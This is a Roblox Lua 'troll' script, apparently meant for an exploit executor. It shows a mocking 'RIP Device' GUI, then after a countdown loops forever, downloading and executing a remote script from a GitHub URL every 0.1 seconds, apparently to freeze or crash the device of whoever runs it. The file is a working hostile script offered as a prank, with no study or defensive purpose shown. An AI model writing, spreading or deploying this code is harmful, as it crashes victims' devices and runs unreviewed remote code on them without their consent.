local screenGui = Instance.new("ScreenGui")
screenGui.Name = "UnknownGui"
screenGui.Parent = game:GetService("CoreGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 50)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
title.Text = "RIP Device 💯"
title.TextColor3 = Color3.new(1, 1, 1)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.Parent = frame

local message = Instance.new("TextLabel")
message.Size = UDim2.new(1, -20, 0, 100)
message.Position = UDim2.new(0, 10, 0, 60)
message.BackgroundTransparency = 1
message.Text = "Rest in piss poor device 💀"
message.TextColor3 = Color3.new(1, 1, 1)
message.TextScaled = true
message.Font = Enum.Font.Gotham
message.Parent = frame

local countdown = Instance.new("TextLabel")
countdown.Size = UDim2.new(1, -20, 0, 30)
countdown.Position = UDim2.new(0, 10, 0, 160)
countdown.BackgroundTransparency = 1
countdown.Text = "Think fast chucklenuts!"
countdown.TextColor3 = Color3.new(1, 1, 1)
countdown.TextScaled = true
countdown.Font = Enum.Font.Gotham
countdown.Parent = frame

local function executeBomb()
    local loadstringToExecute = [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Something478/MainScripts/main/LocalHub/Main.lua"))()
    ]]
    

    local success, err = pcall(function()
        loadstring(loadstringToExecute)()
    end)
    
    if not success then
        warn("Error: " .. err)
    end
end

local count = 2
local countdownConnection
countdownConnection = game:GetService("RunService").Heartbeat:Connect(function()
    count = count - 1
    countdown.Text = "Action in " .. math.ceil(count) .. " seconds..."
    
    if count <= 0 then
        countdownConnection:Disconnect()
        countdown.Text = "TROLLED BY PLASMABYTE"
        
        while true do
            executeBomb()
            wait(0.1)
        end
    end
end)